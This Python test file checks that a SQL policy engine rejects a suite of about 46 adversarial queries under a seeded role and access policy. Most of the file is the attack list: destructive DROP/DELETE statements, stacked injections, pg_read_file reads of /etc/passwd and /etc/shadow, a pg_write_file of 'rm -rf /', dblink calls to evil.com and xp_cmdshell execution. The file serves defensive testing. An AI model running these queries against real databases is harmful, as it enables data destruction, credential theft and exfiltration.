import pytest
from sqlalchemy.orm import Session
from app.models.policy import DataPolicy, SemanticCatalog, DataSource
from app.services.policy_engine import PolicyEngine


# Comprehensive suite of 45+ adversarial attack cases (Task T-23 / REQ-SAFE-05 / Rule R6.6)
ADVERSARIAL_ATTACK_SUITE = [
    # Category 1: Destructive DDL
    {"name": "DROP TABLE direct", "sql": "DROP TABLE employees;"},
    {"name": "DROP TABLE IF EXISTS with cascade", "sql": "DROP TABLE IF EXISTS orders CASCADE;"},
    {"name": "TRUNCATE TABLE", "sql": "TRUNCATE TABLE sales;"},
    {"name": "ALTER TABLE add column", "sql": "ALTER TABLE employees ADD COLUMN backdoor_key VARCHAR(100);"},
    {"name": "ALTER TABLE drop column", "sql": "ALTER TABLE customers DROP COLUMN email;"},
    {"name": "CREATE TABLE backdoor", "sql": "CREATE TABLE evil_table (id INT, payload TEXT);"},
    {"name": "CREATE USER hacker", "sql": "CREATE USER evil_user WITH PASSWORD 'pwned';"},

    # Category 2: Modifying DML
    {"name": "DELETE FROM table", "sql": "DELETE FROM customers WHERE customer_id = 1;"},
    {"name": "DELETE all rows", "sql": "DELETE FROM sales;"},
    {"name": "UPDATE table values", "sql": "UPDATE employees SET salary = salary * 10 WHERE department_id = 1;"},
    {"name": "UPDATE customers", "sql": "UPDATE customers SET email = 'attacker@evil.com';"},
    {"name": "INSERT INTO employees", "sql": "INSERT INTO employees (first_name, salary) VALUES ('Hacker', 999999);"},
    {"name": "INSERT with SELECT", "sql": "INSERT INTO employees SELECT * FROM old_employees;"},

    # Category 3: Privilege Escalation
    {"name": "GRANT ALL PRIVILEGES", "sql": "GRANT ALL PRIVILEGES ON DATABASE db TO guest;"},
    {"name": "GRANT SELECT with grant option", "sql": "GRANT SELECT ON ALL TABLES TO PUBLIC;"},
    {"name": "REVOKE ACCESS", "sql": "REVOKE SELECT ON employees FROM viewer;"},

    # Category 4: Stacked Query / Multi-Statement Injection
    {"name": "Stacked DROP TABLE", "sql": "SELECT * FROM employees; DROP TABLE employees;"},
    {"name": "Stacked UPDATE", "sql": "SELECT 1; UPDATE customers SET balance = 0;"},
    {"name": "Stacked DELETE", "sql": "SELECT COUNT(*) FROM orders; DELETE FROM sales;"},
    {"name": "Stacked INSERT", "sql": "SELECT first_name FROM employees; INSERT INTO employees VALUES (1, 'Evil');"},

    # Category 5: File & Export Attacks
    {"name": "SELECT INTO OUTFILE", "sql": "SELECT * INTO OUTFILE '/tmp/dump.csv' FROM employees;"},
    {"name": "SELECT INTO TABLE", "sql": "SELECT * INTO stolen_employees FROM employees;"},

    # Category 6: Side-Channel & Sleep Attacks (Denial of Service)
    {"name": "pg_sleep DoS", "sql": "SELECT pg_sleep(30) FROM employees;"},
    {"name": "sleep function", "sql": "SELECT sleep(20) FROM customers;"},
    {"name": "benchmark CPU exhaustion", "sql": "SELECT benchmark(50000000, MD5(1)) FROM sales;"},

    # Category 7: Filesystem & Server Reconnaissance
    {"name": "pg_read_file passwd", "sql": "SELECT pg_read_file('/etc/passwd') FROM employees;"},
    {"name": "pg_read_binary_file", "sql": "SELECT pg_read_binary_file('/etc/shadow') FROM employees;"},
    {"name": "pg_write_file backdoor", "sql": "SELECT pg_write_file('/tmp/exploit.sh', 'rm -rf /', false) FROM employees;"},
    {"name": "pg_ls_dir directory list", "sql": "SELECT pg_ls_dir('/var/lib/postgresql') FROM departments;"},
    {"name": "lo_export file write", "sql": "SELECT lo_export(12345, '/tmp/export.bin') FROM orders;"},
    {"name": "lo_import file read", "sql": "SELECT lo_import('/tmp/rootkit.so') FROM orders;"},

    # Category 8: Remote Links & Shell Execution
    {"name": "dblink remote exfiltration", "sql": "SELECT dblink('host=evil.com', 'SELECT 1') FROM orders;"},
    {"name": "dblink_exec remote write", "sql": "SELECT dblink_exec('host=evil.com', 'DROP TABLE users') FROM products;"},
    {"name": "xp_cmdshell command execution", "sql": "SELECT xp_cmdshell('net user') FROM sales;"},
    {"name": "sys_eval shell", "sql": "SELECT sys_eval('id') FROM customers;"},
    {"name": "sys_exec command", "sql": "SELECT sys_exec('whoami') FROM products;"},
    {"name": "session user recon", "sql": "SELECT session_user() FROM customers;"},
    {"name": "terminate backend DoS", "sql": "SELECT pg_terminate_backend(12345) FROM employees;"},

    # Category 9: Resource & Cartesian Joins
    {"name": "Unbounded Cartesian Product Comma", "sql": "SELECT * FROM employees, customers;"},
    {"name": "Explicit CROSS JOIN Unbounded", "sql": "SELECT * FROM orders CROSS JOIN sales;"},
    {"name": "Unjoined JOIN without ON", "sql": "SELECT * FROM departments JOIN employees;"},

    # Category 10: Unauthorized Tables (Deny-by-Default)
    {"name": "Unauthorized table payroll", "sql": "SELECT payroll_id FROM payroll;"},
    {"name": "Unauthorized table audit_logs", "sql": "SELECT log_text FROM audit_logs;"},

    # Category 11: Unauthorized Columns & Sensitive Aggregates
    {"name": "Unauthorized column SSN", "sql": "SELECT customer_name, ssn FROM customers;"},
    {"name": "Aggregate inference bypass on Salary (AVG)", "sql": "SELECT AVG(salary) FROM employees;"},
    {"name": "Aggregate inference bypass on Salary (SUM)", "sql": "SELECT SUM(salary) FROM employees;"},
]


@pytest.fixture
def seed_adversarial_suite_db(db_session: Session):
    """Sets up controlled environment for running the 45+ attack suite."""
    ds = DataSource(data_source_id=1, name="Primary DB", db_type="postgresql", secret_ref="env:SECRET")
    db_session.add(ds)

    # Role 10: Viewer/Analyst with read access to employees, customers, orders, products, sales, departments
    # BUT:
    # - payroll table has NO row (deny-by-default)
    # - audit_logs table has NO row (deny-by-default)
    # - customers.ssn is explicitly DENIED
    # - employees.salary is NOT aggregate_allowed (Rule R1.4)
    tables = ["employees", "customers", "orders", "products", "sales", "departments"]
    for t in tables:
        db_session.add(DataPolicy(role_id=10, data_source_id=1, table_name=t, access_level="read", aggregate_allowed=False))
    
    # Explicit denial of SSN
    db_session.add(DataPolicy(role_id=10, data_source_id=1, table_name="customers", column_name="ssn", access_level="denied"))

    # Catalog entries
    catalog_entries = [
        SemanticCatalog(data_source_id=1, table_name="employees", column_name="employee_id", semantic_type="id", sensitivity="NONE"),
        SemanticCatalog(data_source_id=1, table_name="employees", column_name="first_name", semantic_type="name", sensitivity="LOW"),
        SemanticCatalog(data_source_id=1, table_name="employees", column_name="salary", semantic_type="currency", sensitivity="HIGH", default_aggregation="AVG"),
        SemanticCatalog(data_source_id=1, table_name="customers", column_name="customer_id", semantic_type="id", sensitivity="NONE"),
        SemanticCatalog(data_source_id=1, table_name="customers", column_name="customer_name", semantic_type="name", sensitivity="LOW"),
        SemanticCatalog(data_source_id=1, table_name="customers", column_name="ssn", semantic_type="identifier", sensitivity="HIGH"),
        SemanticCatalog(data_source_id=1, table_name="orders", column_name="order_id", semantic_type="id", sensitivity="NONE"),
        SemanticCatalog(data_source_id=1, table_name="products", column_name="product_id", semantic_type="id", sensitivity="NONE"),
        SemanticCatalog(data_source_id=1, table_name="sales", column_name="sale_id", semantic_type="id", sensitivity="NONE"),
        SemanticCatalog(data_source_id=1, table_name="departments", column_name="department_id", semantic_type="id", sensitivity="NONE"),
    ]
    for c in catalog_entries:
        db_session.add(c)

    db_session.commit()
    return db_session


def test_full_policy_engine_blocks_100_percent_attacks(seed_adversarial_suite_db: Session):
    """
    Task T-23 / REQ-SAFE-05 / Rule R6.6:
    Runs the full adversarial suite of >=40 attacks against PolicyEngine.
    Every single attack MUST be rejected (100% block rate).
    """
    db = seed_adversarial_suite_db
    blocked_count = 0
    total_attacks = len(ADVERSARIAL_ATTACK_SUITE)
    failed_attacks = []

    for attack in ADVERSARIAL_ATTACK_SUITE:
        name = attack["name"]
        sql = attack["sql"]

        result = PolicyEngine.validate_sql(db=db, role_id=10, data_source_id=1, sql=sql)

        if not result.is_allowed and result.status == "REJECTED" and len(result.violations) > 0:
            blocked_count += 1
        else:
            failed_attacks.append(f"Attack '{name}' bypassed policy: {sql}")

    assert blocked_count == total_attacks, (
        f"Security Failure: Blocked {blocked_count}/{total_attacks} attacks. Bypasses:\n" + "\n".join(failed_attacks)
    )
